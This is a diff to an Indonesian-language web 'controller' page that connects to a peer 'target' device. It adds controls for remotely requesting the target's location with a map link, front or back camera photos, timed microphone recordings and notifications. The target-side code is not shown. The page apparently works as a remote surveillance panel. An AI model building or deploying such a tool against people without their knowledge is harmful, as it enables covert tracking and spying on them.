@@ -85,7 +85,7 @@
       border-radius: 24px;
       padding: 16px;
       margin-top: 16px;
-      max-height: 350px;
+      max-height: 400px;
       overflow-y: auto;
     }
     .result-title {
@@ -95,7 +95,7 @@
     }
     .result-item {
       background: white;
-      padding: 10px;
+      padding: 12px;
       border-radius: 16px;
       margin-bottom: 8px;
       font-size: 0.8rem;
@@ -103,6 +103,41 @@
     }
     img.result-img { max-width: 100%; border-radius: 16px; margin-top: 8px; }
     audio { width: 100%; margin-top: 8px; }
+    
+    .camera-options {
+      display: flex;
+      gap: 10px;
+      margin: 10px 0;
+      flex-wrap: wrap;
+    }
+    .cam-choice {
+      background: #e1f5fe;
+      padding: 8px 16px;
+      border-radius: 40px;
+      font-size: 0.8rem;
+      font-weight: 600;
+      cursor: pointer;
+      border: none;
+      color: #01579b;
+    }
+    video {
+      border-radius: 20px;
+      margin-top: 10px;
+      width: 100%;
+      max-width: 280px;
+      background: #000;
+    }
+    .google-maps-link {
+      display: inline-block;
+      background: #0288d1;
+      color: white;
+      padding: 8px 16px;
+      border-radius: 40px;
+      text-decoration: none;
+      margin-top: 8px;
+      font-weight: bold;
+      font-size: 0.8rem;
+    }
   </style>
 </head>
 <body>
@@ -123,11 +158,10 @@
   </div>
   
   <div class="buttons-grid">
-    <button class="ctrl-btn" id="btnLokasi" disabled>📍 Ambil Lokasi</button>
+    <button class="ctrl-btn" id="btnLokasi" disabled>🗾 Ambil Lokasi</button>
     <button class="ctrl-btn" id="btnNotif" disabled>🔔 Kirim Notifikasi</button>
-    <button class="ctrl-btn" id="btnFoto" disabled>📷 Ambil Foto</button>
-    <button class="ctrl-btn" id="btnRekam" disabled>🎙️ Mulai Rekam</button>
-    <button class="ctrl-btn" id="btnStopRekam" disabled>⏹️ Stop & Kirim</button>
+    <button class="ctrl-btn" id="btnKamera" disabled>📷 Akses Kamera</button>
+    <button class="ctrl-btn" id="btnMikrofon" disabled>🎙️ Akses Mikrofon</button>
   </div>
   
   <div class="result-area">
@@ -144,6 +178,10 @@
   let connection = null;
   let isConnected = false;
   
+  // State untuk kamera lokal (di controller, untuk preview)
+  let activeCameraStream = null;
+  let activeCameraCard = null;
+  
   const resultList = document.getElementById('resultList');
   const connectionStatus = document.getElementById('connectionStatus');
   const peerIdInput = document.getElementById('peerIdInput');
@@ -152,9 +190,8 @@
   const btns = {
     lokasi: document.getElementById('btnLokasi'),
     notif: document.getElementById('btnNotif'),
-    foto: document.getElementById('btnFoto'),
-    rekam: document.getElementById('btnRekam'),
-    stopRekam: document.getElementById('btnStopRekam')
+    kamera: document.getElementById('btnKamera'),
+    mikrofon: document.getElementById('btnMikrofon')
   };
   
   function enableButtons(enabled) {
@@ -173,7 +210,12 @@
     } else {
       switch(type) {
         case 'location':
-          content += `📍 Latitude: ${data.lat}<br>📍 Longitude: ${data.lng}<br>🎯 Akurasi: ±${Math.round(data.accuracy)} meter`;
+          const lat = data.lat;
+          const lng = data.lng;
+          const acc = data.accuracy;
+          content += `📍 Latitude: ${lat}<br>📍 Longitude: ${lng}<br>🎯 Akurasi: ±${Math.round(acc)} meter`;
+          const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}&hl=id&z=18`;
+          content += `<br><a href="${googleMapsUrl}" target="_blank" class="google-maps-link">🗾 Buka di Google Maps</a>`;
           break;
         case 'notification':
           content += `🔔 Notifikasi: "${data.message}"`;
@@ -194,7 +236,7 @@
     
     div.innerHTML = content;
     resultList.prepend(div);
-    if (resultList.children.length > 15) {
+    if (resultList.children.length > 20) {
       resultList.removeChild(resultList.lastChild);
     }
   }
@@ -215,6 +257,217 @@
     addResult('command', `📤 Mengirim perintah: ${type}`);
   }
   
+  // =============== FITUR KAMERA DI CONTROLLER (untuk preview dan kirim perintah) ===============
+  function stopAnyCamera() {
+    if (activeCameraStream) {
+      activeCameraStream.getTracks().forEach(track => track.stop());
+      activeCameraStream = null;
+    }
+    if (activeCameraCard && activeCameraCard.parentNode) {
+      activeCameraCard.remove();
+      activeCameraCard = null;
+    }
+  }
+  
+  async function onShowCamera() {
+    // Hapus tampilan sebelumnya
+    const existingCard = document.getElementById('camera-card-temp');
+    if (existingCard) existingCard.remove();
+    stopAnyCamera();
+    
+    if (!isConnected) {
+      addResult('error', { error: 'Belum terhubung ke target. Hubungkan dulu!' }, true);
+      return;
+    }
+    
+    // Buat card kamera untuk preview dan perintah
+    const card = document.createElement('div');
+    card.style.background = '#eef5fc';
+    card.style.borderRadius = '24px';
+    card.style.padding = '16px';
+    card.style.marginTop = '8px';
+    card.id = 'camera-card-temp';
+    
+    const btnDiv = document.createElement('div');
+    btnDiv.className = 'camera-options';
+    
+    const frontBtn = document.createElement('button');
+    frontBtn.innerText = '🤳 Minta Kamera Depan Target';
+    frontBtn.className = 'cam-choice';
+    
+    const backBtn = document.createElement('button');
+    backBtn.innerText = '📸 Minta Kamera Belakang Target';
+    backBtn.className = 'cam-choice';
+    
+    btnDiv.appendChild(frontBtn);
+    btnDiv.appendChild(backBtn);
+    
+    const infoText = document.createElement('div');
+    infoText.style.margin = '10px 0';
+    infoText.style.fontSize = '0.8rem';
+    infoText.style.color = '#0288d1';
+    infoText.innerHTML = '📷 Klik tombol di atas untuk meminta target mengambil foto (dengan kamera pilihan)';
+    
+    card.appendChild(btnDiv);
+    card.appendChild(infoText);
+    
+    // Tombol untuk meminta foto (tanpa preview lokal)
+    const requestPhotoBtn = document.createElement('button');
+    requestPhotoBtn.innerText = '📸 Ambil Foto dari Target';
+    requestPhotoBtn.style.background = '#0288d1';
+    requestPhotoBtn.style.border = 'none';
+    requestPhotoBtn.style.padding = '12px 20px';
+    requestPhotoBtn.style.borderRadius = '40px';
+    requestPhotoBtn.style.color = 'white';
+    requestPhotoBtn.style.fontWeight = 'bold';
+    requestPhotoBtn.style.marginTop = '10px';
+    requestPhotoBtn.style.width = '100%';
+    requestPhotoBtn.style.cursor = 'pointer';
+    
+    let currentFacing = 'environment'; // default belakang
+    
+    frontBtn.onclick = () => {
+      currentFacing = 'user';
+      addResult('info', '📤 Mengirim perintah ambil foto dengan kamera DEPAN ke target...');
+      sendCommand('take_photo', { facingMode: 'user' });
+    };
+    
+    backBtn.onclick = () => {
+      currentFacing = 'environment';
+      addResult('info', '📤 Mengirim perintah ambil foto dengan kamera BELAKANG ke target...');
+      sendCommand('take_photo', { facingMode: 'environment' });
+    };
+    
+    card.appendChild(requestPhotoBtn);
+    
+    const closeBtn = document.createElement('button');
+    closeBtn.innerText = '❌ Tutup Panel Kamera';
+    closeBtn.style.background = '#ff8a65';
+    closeBtn.style.border = 'none';
+    closeBtn.style.padding = '10px 16px';
+    closeBtn.style.borderRadius = '40px';
+    closeBtn.style.color = 'white';
+    closeBtn.style.fontWeight = 'bold';
+    closeBtn.style.marginTop = '10px';
+    closeBtn.style.width = '100%';
+    closeBtn.style.cursor = 'pointer';
+    closeBtn.onclick = () => {
+      card.remove();
+      stopAnyCamera();
+    };
+    card.appendChild(closeBtn);
+    
+    resultList.prepend(card);
+    activeCameraCard = card;
+  }
+  
+  // =============== FITUR MIKROFON DI CONTROLLER ===============
+  let isRecordingActive = false;
+  let recordingStartTime = null;
+  
+  function onMicrophoneRecorder() {
+    if (!isConnected) {
+      addResult('error', { error: 'Belum terhubung ke target. Hubungkan dulu!' }, true);
+      return;
+    }
+    
+    // Hapus card mik sebelumnya
+    const existingMicCard = document.getElementById('temp-mic-card');
+    if (existingMicCard) existingMicCard.remove();
+    
+    const micCard = document.createElement('div');
+    micCard.id = 'temp-mic-card';
+    micCard.style.background = '#eef5fc';
+    micCard.style.borderRadius = '24px';
+    micCard.style.padding = '16px';
+    micCard.style.marginTop = '8px';
+    
+    const statusLabel = document.createElement('span');
+    statusLabel.id = 'micStatus';
+    statusLabel.innerText = '🎤 Belum merekam';
+    statusLabel.style.display = 'block';
+    statusLabel.style.marginBottom = '12px';
+    statusLabel.style.fontWeight = 'bold';
+    
+    const startBtn = document.createElement('button');
+    startBtn.innerText = '🎙️ Mulai Rekam (Target)';
+    startBtn.style.background = '#0288d1';
+    startBtn.style.border = 'none';
+    startBtn.style.padding = '12px 20px';
+    startBtn.style.borderRadius = '40px';
+    startBtn.style.color = 'white';
+    startBtn.style.fontWeight = 'bold';
+    startBtn.style.marginRight = '10px';
+    startBtn.style.cursor = 'pointer';
+    
+    const stopBtn = document.createElement('button');
+    stopBtn.innerText = '⏹️ Stop & Kirim';
+    stopBtn.style.background = '#f44336';
+    stopBtn.style.border = 'none';
+    stopBtn.style.padding = '12px 20px';
+    stopBtn.style.borderRadius = '40px';
+    stopBtn.style.color = 'white';
+    stopBtn.style.fontWeight = 'bold';
+    stopBtn.style.cursor = 'pointer';
+    stopBtn.disabled = true;
+    
+    const closeBtn = document.createElement('button');
+    closeBtn.innerText = '❌ Tutup';
+    closeBtn.style.background = '#ff8a65';
+    closeBtn.style.border = 'none';
+    closeBtn.style.padding = '10px 16px';
+    closeBtn.style.borderRadius = '40px';
+    closeBtn.style.color = 'white';
+    closeBtn.style.fontWeight = 'bold';
+    closeBtn.style.marginTop = '10px';
+    closeBtn.style.cursor = 'pointer';
+    
+    startBtn.onclick = () => {
+      addResult('info', '🎙️ Meminta target mulai merekam suara...');
+      sendCommand('start_record');
+      startBtn.disabled = true;
+      stopBtn.disabled = false;
+      statusLabel.innerText = '🔴 MEREKAM... (klik Stop untuk mengirim)';
+      statusLabel.style.color = '#d32f2f';
+      isRecordingActive = true;
+      
+      // Auto stop setelah 15 detik
+      setTimeout(() => {
+        if (isRecordingActive) {
+          addResult('info', '⏰ Auto-stop setelah 15 detik');
+          sendCommand('stop_record');
+          startBtn.disabled = false;
+          stopBtn.disabled = true;
+          statusLabel.innerText = '🎤 Rekaman selesai';
+          statusLabel.style.color = '#000';
+          isRecordingActive = false;
+        }
+      }, 15000);
+    };
+    
+    stopBtn.onclick = () => {
+      addResult('info', '⏹️ Meminta target berhenti merekam dan mengirim hasil...');
+      sendCommand('stop_record');
+      startBtn.disabled = false;
+      stopBtn.disabled = true;
+      statusLabel.innerText = '🎤 Rekaman dihentikan';
+      statusLabel.style.color = '#000';
+      isRecordingActive = false;
+    };
+    
+    closeBtn.onclick = () => {
+      micCard.remove();
+    };
+    
+    micCard.appendChild(statusLabel);
+    micCard.appendChild(startBtn);
+    micCard.appendChild(stopBtn);
+    micCard.appendChild(closeBtn);
+    
+    resultList.prepend(micCard);
+  }
+  
+  // =============== KONEKSI PEER ===============
   function connectToPeer(peerId) {
     if (connection) {
       connection.close();
@@ -253,6 +506,7 @@
     
     peer.on('open', (id) => {
       console.log('Controller ID:', id);
+      addResult('info', `🆔 ID Controller: ${id.substring(0, 15)}... (untuk referensi)`);
     });
     
     peer.on('error', (err) => {
@@ -263,15 +517,28 @@
     });
   }
   
-  // Event tombol
-  btns.lokasi.onclick = () => sendCommand('location');
-  btns.notif.onclick = () => {
-    const msg = prompt('✏️ Masukkan pesan notifikasi:', 'Halo dari Controller!');
-    if (msg) sendCommand('notification', { message: msg });
+  // Event tombol utama
+  btns.lokasi.onclick = () => {
+    if (!isConnected) {
+      addResult('error', { error: 'Belum terhubung ke target!' }, true);
+      return;
+    }
+    sendCommand('location');
   };
-  btns.foto.onclick = () => sendCommand('take_photo');
-  btns.rekam.onclick = () => sendCommand('start_record');
-  btns.stopRekam.onclick = () => sendCommand('stop_record');
+  
+  btns.notif.onclick = () => {
+    if (!isConnected) {
+      addResult('error', { error: 'Belum terhubung ke target!' }, true);
+      return;
+    }
+    const msg = prompt('✏️ Masukkan pesan notifikasi:', 'Halo dari Controller!');
+    if (msg && msg.trim()) {
+      sendCommand('notification', { message: msg });
+    }
+  };
+  
+  btns.kamera.onclick = onShowCamera;
+  btns.mikrofon.onclick = onMicrophoneRecorder;
   
   connectBtn.onclick = () => {
     const peerId = peerIdInput.value.trim();
